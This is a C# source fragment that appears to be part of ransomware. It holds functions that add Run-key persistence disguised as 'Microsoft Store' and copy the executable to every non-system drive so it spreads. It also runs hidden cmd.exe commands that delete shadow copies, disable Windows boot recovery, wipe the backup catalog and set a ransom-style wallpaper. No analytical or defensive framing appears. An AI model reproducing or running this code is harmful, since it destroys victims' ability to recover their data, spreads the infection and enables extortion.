	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
